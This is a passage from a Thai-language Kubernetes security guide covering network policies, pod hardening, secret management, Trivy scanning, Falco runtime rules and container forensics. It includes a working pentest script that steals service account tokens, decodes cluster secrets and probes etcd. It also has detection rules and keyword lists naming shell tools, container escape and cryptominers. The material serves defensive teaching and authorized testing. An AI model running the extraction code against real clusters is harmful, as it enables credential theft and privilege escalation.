    - Ingress
    - Egress
  # ไม่มี ingress/egress rules = deny all

---
# อนุญาตเฉพาะ DNS egress (ทุก pod ต้องการ DNS)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns-egress
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    - ports:
        - port: 53
          protocol: UDP
        - port: 53
          protocol: TCP

---
# อนุญาต web tier รับ ingress จาก internet
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-web-ingress
  namespace: production
spec:
  podSelector:
    matchLabels:
      tier: web
  policyTypes:
    - Ingress
  ingress:
    - from: []  # อนุญาตจากทุกที่
      ports:
        - port: 8080
          protocol: TCP

---
# อนุญาต api tier รับจาก web tier เท่านั้น
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-api-from-web
  namespace: production
spec:
  podSelector:
    matchLabels:
      tier: api
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              tier: web
      ports:
        - port: 3000

---
# อนุญาต db tier รับจาก api tier เท่านั้น
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-db-from-api
  namespace: production
spec:
  podSelector:
    matchLabels:
      tier: db
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              tier: api
      ports:
        - port: 5432
```

### Network Policy Validator

```python
# network_policy_validator.py
# ตรวจสอบว่า Network Policies ถูกตั้งค่าถูกต้อง

import subprocess
import json

class NetworkPolicyValidator:
    
    def get_namespaces(self):
        result = subprocess.run(
            ["kubectl", "get", "namespaces", "-o", "json"],
            capture_output=True, text=True
        )
        data = json.loads(result.stdout)
        return [item["metadata"]["name"] for item in data.get("items", [])]
    
    def get_network_policies(self, namespace: str):
        result = subprocess.run(
            ["kubectl", "get", "networkpolicies", "-n", namespace, "-o", "json"],
            capture_output=True, text=True
        )
        if result.returncode != 0:
            return []
        return json.loads(result.stdout).get("items", [])
    
    def check_namespace(self, namespace: str):
        """ตรวจสอบ Network Policies ใน namespace"""
        issues = []
        policies = self.get_network_policies(namespace)
        
        if not policies:
            issues.append({
                "severity": "HIGH",
                "issue": "No NetworkPolicies defined - all traffic allowed"
            })
            return issues
        
        # ตรวจว่ามี default deny
        has_default_deny_ingress = False
        has_default_deny_egress = False
        
        for policy in policies:
            spec = policy.get("spec", {})
            pod_selector = spec.get("podSelector", {})
            policy_types = spec.get("policyTypes", [])
            ingress_rules = spec.get("ingress", [])
            egress_rules = spec.get("egress", [])
            
            # Default deny = podSelector: {} + no rules for that type
            is_catch_all = pod_selector == {} or not pod_selector.get("matchLabels")
            
            if is_catch_all:
                if "Ingress" in policy_types and not ingress_rules:
                    has_default_deny_ingress = True
                if "Egress" in policy_types and not egress_rules:
                    has_default_deny_egress = True
        
        if not has_default_deny_ingress:
            issues.append({
                "severity": "MEDIUM",
                "issue": "No default-deny ingress policy"
            })
        if not has_default_deny_egress:
            issues.append({
                "severity": "MEDIUM",
                "issue": "No default-deny egress policy"
            })
        
        return issues
    
    def run_validation(self):
        print("Kubernetes Network Policy Validation")
        print("=" * 50)
        
        skip_namespaces = {"kube-system", "kube-public", "kube-node-lease"}
        namespaces = [ns for ns in self.get_namespaces() 
                      if ns not in skip_namespaces]
        
        for ns in namespaces:
            issues = self.check_namespace(ns)
            if issues:
                print(f"\n[{ns}]")
                for issue in issues:
                    icon = "[ ! ]" if issue["severity"] == "HIGH" else "[ M ]"
                    print(f"  {icon} {issue['issue']}")
            else:
                print(f"[ OK ] {ns}")

if __name__ == "__main__":
    validator = NetworkPolicyValidator()
    validator.run_validation()
```

---

## 8. Pod Security Standards

### Pod Security Standards (PSS) Configuration

```yaml
# namespace-pss.yaml
# กำหนด Pod Security Standards ระดับ namespace

apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    # enforce = block pods ที่ไม่ผ่าน
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: v1.28
    # audit = log pods ที่ไม่ผ่าน
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/audit-version: v1.28
    # warn = warn เมื่อสร้าง pods ที่ไม่ผ่าน
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/warn-version: v1.28
```

### Restricted Pod Spec

```yaml
# secure-pod.yaml
# Pod ที่ผ่าน restricted PSS

apiVersion: v1
kind: Pod
metadata:
  name: secure-app
  namespace: production
spec:
  # ปิด service account token auto-mount
  automountServiceAccountToken: false
  
  # Security context ระดับ Pod
  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    runAsGroup: 10001
    fsGroup: 10001
    seccompProfile:
      type: RuntimeDefault
    sysctls: []  # ไม่อนุญาต sysctls
  
  containers:
    - name: app
      image: myapp:1.0.0@sha256:abc123...  # pin ด้วย digest
      
      # Security context ระดับ Container
      securityContext:
        allowPrivilegeEscalation: false
        privileged: false
        readOnlyRootFilesystem: true
        runAsNonRoot: true
        runAsUser: 10001
        capabilities:
          drop:
            - ALL  # ลบ capabilities ทั้งหมด
          # add เฉพาะที่จำเป็น:
          # add:
          #   - NET_BIND_SERVICE  # ถ้าต้องการ bind port < 1024
      
      resources:
        limits:
          memory: "128Mi"
          cpu: "500m"
          ephemeral-storage: "1Gi"
        requests:
          memory: "64Mi"
          cpu: "250m"
      
      # Volume mounts แบบ read-only
      volumeMounts:
        - name: config
          mountPath: /etc/app
          readOnly: true
        - name: tmp
          mountPath: /tmp  # writable tmp
      
      ports:
        - containerPort: 8080
      
      livenessProbe:
        httpGet:
          path: /health
          port: 8080
        initialDelaySeconds: 10
        periodSeconds: 30
      
      readinessProbe:
        httpGet:
          path: /ready
          port: 8080
        initialDelaySeconds: 5
        periodSeconds: 10
  
  volumes:
    - name: config
      configMap:
        name: app-config
    - name: tmp
      emptyDir:
        sizeLimit: 100Mi  # จำกัดขนาด
  
  # ไม่ให้ schedule บน control plane
  nodeSelector:
    kubernetes.io/os: linux
  
  # Toleration ที่ปลอดภัย
  tolerations: []
```

---

## 9. Secret Management in Kubernetes

### External Secrets with Vault

```yaml
# external-secrets.yaml
# ใช้ External Secrets Operator + HashiCorp Vault

---
# SecretStore - กำหนด provider
apiVersion: external-secrets.io/v1beta1
kind: SecretStore
metadata:
  name: vault-backend
  namespace: production
spec:
  provider:
    vault:
      server: "https://vault.company.com"
      path: "secret"
      version: "v2"
      auth:
        kubernetes:
          mountPath: "kubernetes"
          role: "production-app"
          serviceAccountRef:
            name: "vault-auth"

---
# ExternalSecret - ดึง secret จาก Vault
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: app-database-credentials
  namespace: production
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: vault-backend
    kind: SecretStore
  target:
    name: database-secret  # ชื่อ K8s Secret ที่จะสร้าง
    creationPolicy: Owner
    template:
      engineVersion: v2
      data:
        DB_HOST: "{{ .db_host }}"
        DB_USER: "{{ .db_user }}"
        DB_PASS: "{{ .db_pass }}"
  data:
    - secretKey: db_host
      remoteRef:
        key: production/database
        property: host
    - secretKey: db_user
      remoteRef:
        key: production/database
        property: username
    - secretKey: db_pass
      remoteRef:
        key: production/database
        property: password
```

### Sealed Secrets

```bash
# ติดตั้ง Sealed Secrets Controller
kubectl apply -f https://github.com/bitnami-labs/sealed-secrets/releases/download/v0.24.0/controller.yaml

# ดาวน์โหลด kubeseal
wget https://github.com/bitnami-labs/sealed-secrets/releases/download/v0.24.0/kubeseal-0.24.0-linux-amd64.tar.gz
tar -xf kubeseal-*.tar.gz
mv kubeseal /usr/local/bin/

# สร้าง Secret ปกติก่อน
kubectl create secret generic my-secret \
  --from-literal=password=SuperSecret123 \
  --dry-run=client \
  -o yaml > my-secret.yaml

# Seal ด้วย kubeseal
kubeseal --format=yaml < my-secret.yaml > my-sealed-secret.yaml

# ดู sealed secret (ปลอดภัยที่จะ commit ไป git)
cat my-sealed-secret.yaml

# Apply sealed secret (controller จะ decrypt)
kubectl apply -f my-sealed-secret.yaml

# ตรวจสอบ
kubectl get secret my-secret -o jsonpath='{.data.password}' | base64 -d
```

---

## 10. Container Image Scanning

### Trivy Image Scanner

```python
# image_scanner.py
# สแกน container images ด้วย Trivy

import subprocess
import json
from dataclasses import dataclass
from typing import List, Optional
from datetime import datetime

@dataclass
class Vulnerability:
    vuln_id: str
    pkg_name: str
    installed_version: str
    fixed_version: str
    severity: str
    title: str
    primary_url: str

@dataclass
class ScanResult:
    image: str
    scan_time: str
    total_vulns: int
    by_severity: dict
    vulnerabilities: List[Vulnerability]
    critical_count: int
    high_count: int

class ContainerImageScanner:
    
    SEVERITY_WEIGHTS = {
        "CRITICAL": 10,
        "HIGH": 5,
        "MEDIUM": 2,
        "LOW": 1,
        "UNKNOWN": 0,
    }
    
    def scan_image(self, image: str, 
                   fail_on_severity: str = "CRITICAL") -> ScanResult:
        """สแกน Docker image ด้วย Trivy"""
        print(f"[*] Scanning image: {image}")
        
        cmd = [
            "trivy", "image",
            "--format", "json",
            "--severity", "CRITICAL,HIGH,MEDIUM,LOW",
            "--no-progress",
            "--ignore-unfixed",  # เฉพาะที่มี fix แล้ว
            image
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        
        if result.returncode not in [0, 1]:  # 1 = vulns found
            raise RuntimeError(f"Trivy failed: {result.stderr}")
        
        data = json.loads(result.stdout)
        
        vulns = []
        by_severity = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "UNKNOWN": 0}
        
        for target in data.get("Results", []):
            for v in target.get("Vulnerabilities", []) or []:
                sev = v.get("Severity", "UNKNOWN")
                by_severity[sev] = by_severity.get(sev, 0) + 1
                
                vuln = Vulnerability(
                    vuln_id=v.get("VulnerabilityID", ""),
                    pkg_name=v.get("PkgName", ""),
                    installed_version=v.get("InstalledVersion", ""),
                    fixed_version=v.get("FixedVersion", "N/A"),
                    severity=sev,
                    title=v.get("Title", ""),
                    primary_url=v.get("PrimaryURL", "")
                )
                vulns.append(vuln)
        
        return ScanResult(
            image=image,
            scan_time=datetime.now().isoformat(),
            total_vulns=len(vulns),
            by_severity=by_severity,
            vulnerabilities=vulns,
            critical_count=by_severity["CRITICAL"],
            high_count=by_severity["HIGH"]
        )
    
    def scan_kubernetes_images(self) -> List[ScanResult]:
        """สแกน images ทั้งหมดใน Kubernetes cluster"""
        # ดึง images ทั้งหมดจาก running pods
        result = subprocess.run(
            ["kubectl", "get", "pods", "--all-namespaces",
             "-o", "jsonpath={range .items[*]}{.spec.containers[*].image}{'\\n'}{end}"],
            capture_output=True, text=True
        )
        
        images = set(result.stdout.strip().split())
        print(f"[*] Found {len(images)} unique images")
        
        results = []
        for image in images:
            try:
                scan_result = self.scan_image(image)
                results.append(scan_result)
            except Exception as e:
                print(f"[!] Failed to scan {image}: {e}")
        
        return results
    
    def generate_report(self, results: List[ScanResult], 
                        output_file: str = None):
        """สร้าง security report"""
        total_critical = sum(r.critical_count for r in results)
        total_high = sum(r.high_count for r in results)
        
        report_lines = [
            "Container Image Security Report",
            "=" * 60,
            f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"Images Scanned: {len(results)}",
            f"Total CRITICAL: {total_critical}",
            f"Total HIGH: {total_high}",
            "",
            "Per-Image Summary:",
            "-" * 60,
        ]
        
        # Sort by risk score
        results.sort(
            key=lambda r: r.critical_count * 10 + r.high_count,
            reverse=True
        )
        
        for r in results:
            risk_score = r.critical_count * 10 + r.high_count * 5
            status = "FAIL" if r.critical_count > 0 else \
                     "WARN" if r.high_count > 0 else "PASS"
            
            report_lines.extend([
                f"\n[{status}] {r.image}",
                f"  Risk Score: {risk_score}",
                f"  Vulnerabilities: C={r.critical_count} H={r.high_count} "
                f"M={r.by_severity.get('MEDIUM', 0)} L={r.by_severity.get('LOW', 0)}",
            ])
            
            # แสดง critical vulns
            critical_vulns = [v for v in r.vulnerabilities if v.severity == "CRITICAL"]
            for vuln in critical_vulns[:3]:  # แสดงแค่ 3 อันแรก
                report_lines.append(
                    f"  [CRIT] {vuln.vuln_id}: {vuln.pkg_name} {vuln.installed_version} "
                    f"→ {vuln.fixed_version}"
                )
        
        report = "\n".join(report_lines)
        
        if output_file:
            with open(output_file, 'w') as f:
                f.write(report)
        
        print(report)
        return total_critical == 0  # True = passed

# GitHub Actions integration
if __name__ == "__main__":
    import sys
    scanner = ContainerImageScanner()
    
    image = sys.argv[1] if len(sys.argv) > 1 else "ubuntu:latest"
    
    try:
        result = scanner.scan_image(image)
        scanner.generate_report([result])
        
        # ล้มเหลวถ้ามี CRITICAL vulnerabilities
        if result.critical_count > 0:
            print(f"\n[FAIL] {result.critical_count} CRITICAL vulnerabilities found!")
            sys.exit(1)
        elif result.high_count > 0:
            print(f"\n[WARN] {result.high_count} HIGH vulnerabilities found")
            sys.exit(0)
        else:
            print("\n[PASS] No critical vulnerabilities")
            sys.exit(0)
    except Exception as e:
        print(f"[ERROR] {e}")
        sys.exit(2)
```

---

## 11. Runtime Security with Falco

### Falco Rules Configuration

```yaml
# falco-rules-custom.yaml
# Custom Falco rules สำหรับ container security

- rule: Terminal shell in container
  desc: ตรวจจับการเปิด shell ใน running container
  condition: >
    spawned_process and container
    and shell_procs
    and proc.tty != 0
    and container_entrypoint
    and not user_expected_terminal_shell_in_container_conditions
  output: >
    Shell spawned in container (user=%user.name user_loginuid=%user.loginuid
    %container.info shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline
    terminal=%proc.tty container_id=%container.id image=%container.image.repository)
  priority: WARNING
  tags: [container, shell, mitre_execution]

- rule: Write below root in container
  desc: ตรวจจับการเขียนไฟล์ใน root filesystem
  condition: >
    open_write
    and container
    and fd.name startswith /
    and not fd.name startswith /proc
    and not fd.name startswith /dev
    and not fd.name startswith /tmp
    and not fd.name startswith /var/log
    and not user_known_write_root_conditions
  output: >
    File write below root in container
    (user=%user.name command=%proc.cmdline pid=%proc.pid
    file=%fd.name container_id=%container.id image=%container.image.repository)
  priority: ERROR
  tags: [container, filesystem, mitre_persistence]

- rule: Contact K8S API Server from pod
  desc: ตรวจจับ pod ที่พยายามเข้าถึง Kubernetes API
  condition: >
    outbound and k8s_api_server
    and not ka.target.subresource="nodes/proxy"
    and not known_k8s_api_callers
  output: >
    Unexpected connection to K8s API Server from pod
    (command=%proc.cmdline pid=%proc.pid connection=%fd.name
    %container.info image=%container.image.repository)
  priority: WARNING
  tags: [network, k8s, mitre_discovery]

- rule: Privilege escalation attempt
  desc: ตรวจจับความพยายาม escalate privileges
  condition: >
    spawned_process
    and container
    and proc.name in (setuid_binaries, su, sudo, newgrp, newuidmap, newgidmap)
  output: >
    Privilege escalation attempt in container
    (user=%user.name command=%proc.cmdline
    container_id=%container.id image=%container.image.repository)
  priority: CRITICAL
  tags: [container, privilege_escalation, mitre_privilege_escalation]

- rule: Container escape attempt via /proc
  desc: ตรวจจับความพยายาม escape ผ่าน /proc
  condition: >
    open_read
    and container
    and fd.name glob /proc/*/root
    and not proc.name in (container_allowed_processes)
  output: >
    Possible container escape via /proc
    (user=%user.name command=%proc.cmdline file=%fd.name
    container_id=%container.id image=%container.image.repository)
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation]

- rule: Cryptominer detected
  desc: ตรวจจับ cryptocurrency mining
  condition: >
    spawned_process
    and container
    and (
      proc.name in (cryptominer_binaries)
      or proc.cmdline contains "stratum+tcp"
      or proc.cmdline contains "--mining"
      or proc.cmdline contains "xmrig"
      or proc.cmdline contains "cgminer"
    )
  output: >
    Cryptominer process detected in container
    (command=%proc.cmdline container_id=%container.id
    image=%container.image.repository)
  priority: CRITICAL
  tags: [container, cryptomining, mitre_impact]
```

### Falco Alert Handler

```python
# falco_handler.py
# รับและประมวลผล Falco alerts

import json
import subprocess
import asyncio
import aiohttp
from datetime import datetime
from typing import Optional

class FalcoAlertHandler:
    def __init__(self, slack_webhook: str = None, 
                 pagerduty_key: str = None):
        self.slack_webhook = slack_webhook
        self.pagerduty_key = pagerduty_key
        self.auto_respond = True
    
    async def handle_alert(self, alert: dict):
        """ประมวลผล Falco alert"""
        priority = alert.get("priority", "")
        rule = alert.get("rule", "")
        output = alert.get("output", "")
        container_id = self._extract_field(output, "container_id")
        
        print(f"[{datetime.now().isoformat()}] [{priority}] {rule}")
        print(f"  Container: {container_id}")
        print(f"  Output: {output[:200]}")
        
        # Auto-response based on priority
        if priority == "CRITICAL" and self.auto_respond:
            await self.auto_respond_critical(alert, container_id)
        
        # Send notifications
        await self.send_notification(alert)
    
    async def auto_respond_critical(self, alert: dict, 
                                     container_id: Optional[str]):
        """ตอบสนองอัตโนมัติสำหรับ CRITICAL alerts"""
        rule = alert.get("rule", "")
        
        if "escape" in rule.lower() or "privilege" in rule.lower():
            if container_id:
                print(f"[!] AUTO-RESPONSE: Killing suspicious container {container_id}")
                # หยุด container ที่น่าสงสัย
                subprocess.run(["docker", "kill", container_id], 
                               capture_output=True)
                
                # Log incident
                self.log_incident(alert, "container_killed", container_id)
        
        elif "Cryptominer" in rule:
            if container_id:
                print(f"[!] AUTO-RESPONSE: Stopping cryptominer container {container_id}")
                subprocess.run(["docker", "stop", container_id],
                               capture_output=True)
    
    def _extract_field(self, output: str, field: str) -> Optional[str]:
        """ดึงค่า field จาก Falco output string"""
        import re
        pattern = rf'{field}=([\w\-\.:/]+)'
        match = re.search(pattern, output)
        return match.group(1) if match else None
    
    async def send_notification(self, alert: dict):
        """ส่งแจ้งเตือนไปยัง Slack"""
        if not self.slack_webhook:
            return
        
        priority = alert.get("priority", "INFO")
        color_map = {
            "CRITICAL": "#ff0000",
            "ERROR": "#ff6600",
            "WARNING": "#ffcc00",
            "INFO": "#00cc00",
        }
        
        payload = {
            "attachments": [{
                "color": color_map.get(priority, "#cccccc"),
                "title": f"[{priority}] Falco Alert: {alert.get('rule')}",
                "text": alert.get("output", "")[:500],
                "footer": f"Falco | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            }]
        }
        
        async with aiohttp.ClientSession() as session:
            await session.post(self.slack_webhook, json=payload)
    
    def log_incident(self, alert: dict, action: str, target: str):
        """บันทึก incident log"""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "rule": alert.get("rule"),
            "priority": alert.get("priority"),
            "action_taken": action,
            "target": target,
            "output": alert.get("output", "")[:500]
        }
        
        with open("/var/log/falco-incidents.json", "a") as f:
            f.write(json.dumps(log_entry) + "\n")

# กำหนด Falco webhook receiver
from aiohttp import web

handler = FalcoAlertHandler(
    slack_webhook="https://hooks.slack.com/services/xxx/yyy/zzz"
)

async def falco_webhook(request):
    alert = await request.json()
    await handler.handle_alert(alert)
    return web.Response(text="OK")

app = web.Application()
app.router.add_post('/falco', falco_webhook)

if __name__ == '__main__':
    web.run_app(app, host='0.0.0.0', port=9000)
```

---

## 12. Kubernetes Pentesting

### K8s Recon & Enumeration

```python
# k8s_pentester.py
# Kubernetes Penetration Testing (Lab/Authorized Only)

import subprocess
import json
import base64
import requests
from typing import List, Dict, Optional

class KubernetesPentester:
    """ใช้เฉพาะ authorized pentesting เท่านั้น"""
    
    def __init__(self, api_server: str = None, 
                 token: str = None,
                 kubeconfig: str = None):
        self.api_server = api_server
        self.token = token
        self.kubeconfig = kubeconfig
        self.session = requests.Session()
        
        if token:
            self.session.headers["Authorization"] = f"Bearer {token}"
        self.session.verify = False  # lab only
    
    # === 1. Service Account Token Theft ===
    
    def read_service_account_token(self):
        """อ่าน service account token จาก pod"""
        token_paths = [
            "/var/run/secrets/kubernetes.io/serviceaccount/token",
            "/run/secrets/kubernetes.io/serviceaccount/token",
        ]
        
        for path in token_paths:
            try:
                with open(path) as f:
                    token = f.read().strip()
                    print(f"[+] Found SA token at {path}")
                    # Decode JWT payload
                    parts = token.split(".")
                    if len(parts) == 3:
                        payload = json.loads(
                            base64.b64decode(parts[1] + "==")
                        )
                        print(f"    SA: {payload.get('kubernetes.io/serviceaccount/service-account.name')}")
                        print(f"    NS: {payload.get('kubernetes.io/serviceaccount/namespace')}")
                    return token
            except:
                pass
        return None
    
    def read_api_server_url(self):
        """อ่าน API server URL จาก environment"""
        import os
        host = os.environ.get("KUBERNETES_SERVICE_HOST")
        port = os.environ.get("KUBERNETES_SERVICE_PORT")
        if host and port:
            return f"https://{host}:{port}"
        return None
    
    # === 2. RBAC Enumeration ===
    
    def check_permissions(self):
        """ตรวจสอบ permissions ของ current service account"""
        print("\n[*] Checking current permissions...")
        
        # ตรวจ what can I do?
        verbs_to_check = ["get", "list", "create", "delete", "update", "patch"]
        resources_to_check = [
            "pods", "secrets", "configmaps", "services",
            "deployments", "serviceaccounts", "nodes",
            "clusterroles", "clusterrolebindings",
            "namespaces", "persistentvolumes"
        ]
        
        allowed = {}
        for resource in resources_to_check:
            allowed[resource] = []
            for verb in verbs_to_check:
                result = subprocess.run(
                    ["kubectl", "auth", "can-i", verb, resource],
                    capture_output=True, text=True
                )
                if result.stdout.strip() == "yes":
                    allowed[resource].append(verb)
        
        print("\nAllowed Operations:")
        for resource, verbs in allowed.items():
            if verbs:
                print(f"  {resource}: {', '.join(verbs)}")
        
        return allowed
    
    # === 3. Secret Extraction ===
    
    def extract_secrets(self, namespace: str = "default"):
        """ดึง secrets จาก namespace (ถ้ามีสิทธิ์)"""
        print(f"\n[*] Extracting secrets from namespace: {namespace}")
        
        result = subprocess.run(
            ["kubectl", "get", "secrets", "-n", namespace, "-o", "json"],
            capture_output=True, text=True
        )
        
        if result.returncode != 0:
            print("[!] Cannot access secrets")
            return []
        
        secrets_data = json.loads(result.stdout)
        extracted = []
        
        for secret in secrets_data.get("items", []):
            name = secret["metadata"]["name"]
            secret_type = secret.get("type", "")
            data = secret.get("data", {})
            
            decoded_data = {}
            for key, value in data.items():
                try:
                    decoded_data[key] = base64.b64decode(value).decode("utf-8")
                except:
                    decoded_data[key] = f"<binary: {len(value)} bytes>"
            
            extracted.append({
                "name": name,
                "type": secret_type,
                "data": decoded_data
            })
            
            print(f"  [+] Secret: {name} (type: {secret_type})")
            for k, v in decoded_data.items():
                # แสดงแค่ sensitive keys
                if any(x in k.lower() for x in ["password", "key", "token", "secret"]):
                    print(f"      {k}: {v[:50]}..." if len(v) > 50 else f"      {k}: {v}")
        
        return extracted
    
    # === 4. RBAC Privilege Escalation ===
    
    def check_privilege_escalation_paths(self):
        """ตรวจสอบ paths สำหรับ privilege escalation"""
        print("\n[*] Checking privilege escalation paths...")
        
        esc_paths = []
        
        # Path 1: สร้าง pod ที่ mount host filesystem
        result = subprocess.run(
            ["kubectl", "auth", "can-i", "create", "pods"],
            capture_output=True, text=True
        )
        if result.stdout.strip() == "yes":
            esc_paths.append({
                "path": "Create privileged pod with host mount",
                "risk": "CRITICAL",
                "description": "Can create pod that mounts host / filesystem"
            })
        
        # Path 2: exec into existing pod
        result = subprocess.run(
            ["kubectl", "auth", "can-i", "create", "pods/exec"],
            capture_output=True, text=True
        )
        if result.stdout.strip() == "yes":
            esc_paths.append({
                "path": "Exec into privileged pod",
                "risk": "HIGH",
                "description": "Can execute commands in existing pods"
            })
        
        # Path 3: สร้าง/แก้ไข ClusterRoleBinding
        for resource in ["clusterrolebindings", "rolebindings"]:
            for verb in ["create", "patch", "update"]:
                result = subprocess.run(
                    ["kubectl", "auth", "can-i", verb, resource],
                    capture_output=True, text=True
                )
                if result.stdout.strip() == "yes":
                    esc_paths.append({
                        "path": f"{verb} {resource}",
                        "risk": "CRITICAL",
                        "description": f"Can {verb} RBAC bindings to escalate privileges"
                    })
        
        # Path 4: สร้าง ServiceAccount token
        result = subprocess.run(
            ["kubectl", "auth", "can-i", "create", "serviceaccounts/token"],
            capture_output=True, text=True
        )
        if result.stdout.strip() == "yes":
            esc_paths.append({
                "path": "Create ServiceAccount tokens",
                "risk": "HIGH",
                "description": "Can impersonate other service accounts"
            })
        
        for path in esc_paths:
            print(f"  [{path['risk']}] {path['path']}")
            print(f"           {path['description']}")
        
        return esc_paths
    
    # === 5. etcd Access (if accessible) ===
    
    def check_etcd_access(self, etcd_endpoint: str = "http://127.0.0.1:2379"):
        """ตรวจสอบการเข้าถึง etcd โดยตรง"""
        print(f"\n[*] Checking etcd access at {etcd_endpoint}")
        
        try:
            # etcdctl v3
            result = subprocess.run(
                ["etcdctl", "--endpoints", etcd_endpoint,
                 "endpoint", "health"],
                capture_output=True, text=True, timeout=5
            )
            
            if "is healthy" in result.stdout:
                print("[!!!] etcd is accessible without auth!")
                
                # ดึง Kubernetes secrets
                result = subprocess.run(
                    ["etcdctl", "--endpoints", etcd_endpoint,
                     "get", "/registry/secrets/",
                     "--prefix", "--keys-only"],
                    capture_output=True, text=True, timeout=10
                )
                
                secret_keys = result.stdout.strip().split("\n")
                print(f"[+] Found {len(secret_keys)} secrets in etcd")
                for key in secret_keys[:5]:  # แสดงแค่ 5 อันแรก
                    print(f"    {key}")
                    
                return True
        except Exception as e:
            print(f"[-] etcd not accessible: {e}")
        
        return False

# Lab environment test
if __name__ == "__main__":
    pentester = KubernetesPentester()
    
    print("=" * 60)
    print("Kubernetes Penetration Test - AUTHORIZED TESTING ONLY")
    print("=" * 60)
    
    token = pentester.read_service_account_token()
    if token:
        pentester.token = token
        pentester.api_server = pentester.read_api_server_url()
    
    perms = pentester.check_permissions()
    esc_paths = pentester.check_privilege_escalation_paths()
    
    if any(v for v in perms.get("secrets", [])):
        pentester.extract_secrets()
```

---

## 13. Container Forensics

### Container Forensic Investigation

```python
# container_forensics.py
# ทำ forensics บน compromised container

import subprocess
import json
import os
import hashlib
from datetime import datetime
from pathlib import Path

class ContainerForensics:
    
    def __init__(self, container_id: str, output_dir: str):
        self.container_id = container_id
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.evidence = []
    
    def preserve_container_state(self):
        """เก็บ container state ก่อน terminate"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        print(f"[*] Preserving container {self.container_id}")
        
        # 1. Export container filesystem
        export_path = self.output_dir / f"container_fs_{timestamp}.tar"
        print(f"[*] Exporting filesystem to {export_path}")
        subprocess.run(
            ["docker", "export", "-o", str(export_path), self.container_id],
            check=True
        )
        self.evidence.append({
            "type": "filesystem",
            "path": str(export_path),
            "hash": self._sha256(export_path)
        })
        
        # 2. Inspect container metadata
        inspect_path = self.output_dir / f"inspect_{timestamp}.json"
        result = subprocess.run(
            ["docker", "inspect", self.container_id],
            capture_output=True, text=True
        )
        inspect_path.write_text(result.stdout)
        self.evidence.append({
            "type": "metadata",
            "path": str(inspect_path)
        })
        
        # 3. Process list
        proc_path = self.output_dir / f"processes_{timestamp}.txt"
        result = subprocess.run(
            ["docker", "top", self.container_id, "auxf"],
            capture_output=True, text=True
        )
        proc_path.write_text(result.stdout)
        self.evidence.append({
            "type": "processes",
            "path": str(proc_path)
        })
        
        # 4. Network connections
        net_path = self.output_dir / f"network_{timestamp}.txt"
        result = subprocess.run(
            ["docker", "exec", self.container_id, "ss", "-tunap"],
            capture_output=True, text=True
        )
        net_path.write_text(result.stdout)
        self.evidence.append({
            "type": "network",
            "path": str(net_path)
        })
        
        # 5. Container logs
        logs_path = self.output_dir / f"logs_{timestamp}.txt"
        result = subprocess.run(
            ["docker", "logs", "--timestamps", self.container_id],
            capture_output=True, text=True
        )
        logs_path.write_text(result.stdout + result.stderr)
        self.evidence.append({
            "type": "logs",
            "path": str(logs_path)
        })
        
        # 6. Environment variables
        env_path = self.output_dir / f"environment_{timestamp}.txt"
        result = subprocess.run(
            ["docker", "exec", self.container_id, "env"],
            capture_output=True, text=True
        )
        env_path.write_text(result.stdout)
        self.evidence.append({
            "type": "environment",
            "path": str(env_path)
        })
        
        return self.evidence
    
    def analyze_filesystem(self, fs_export_path: str):
        """วิเคราะห์ filesystem ที่ export มา"""
        import tarfile
        
        print("[*] Analyzing filesystem...")
        
        findings = {
            "suspicious_files": [],
            "setuid_files": [],
            "world_writable": [],
            "hidden_files": [],
            "scripts": [],
        }
        
        with tarfile.open(fs_export_path, "r") as tar:
            for member in tar.getmembers():
                path = member.name
                mode = member.mode
                
                # SUID/SGID files ที่ไม่คาดหมาย
                if mode & 0o4000 or mode & 0o2000:  # SUID or SGID
                    findings["setuid_files"].append(path)
                
                # Hidden files ใน unusual locations
                name = os.path.basename(path)
                if name.startswith(".") and path not in [
                    ".dockerenv", ".bashrc", ".bash_profile"
                ]:
                    findings["hidden_files"].append(path)
                
                # Script files ใน /tmp, /dev/shm
                if (path.startswith("tmp/") or path.startswith("dev/shm")):
                    if path.endswith((".sh", ".py", ".pl", ".rb")):
                        findings["scripts"].append(path)
                
                # Suspicious executables
                suspicious_names = [
                    "nc", "ncat", "netcat", "socat",
                    "nmap", "masscan", "hydra",
                    "meterpreter", "beacon",
                    "backdoor", "shell", "exploit",
                ]
                if name.lower() in suspicious_names:
                    findings["suspicious_files"].append(path)
        
        return findings
    
    def check_image_layers(self):
        """ตรวจสอบ image layers สำหรับ secrets"""
        print("[*] Checking image layers for secrets...")
        
        # Get image history
        result = subprocess.run(
            ["docker", "history", "--no-trunc", 
             "--format", "{{.CreatedBy}}",
             self.container_id],
            capture_output=True, text=True
        )
        
        import re
        secret_patterns = [
            (r'password[=:\s]+[\S]+', "PASSWORD"),
            (r'api[_-]?key[=:\s]+[\S]+', "API_KEY"),
            (r'secret[=:\s]+[\S]+', "SECRET"),
            (r'token[=:\s]+[\S]+', "TOKEN"),
            (r'[A-Z0-9]{20,}', "POSSIBLE_KEY"),
        ]
        
        secrets_found = []
        for i, layer in enumerate(result.stdout.splitlines()):
            for pattern, label in secret_patterns:
                matches = re.findall(pattern, layer, re.I)
                for match in matches:
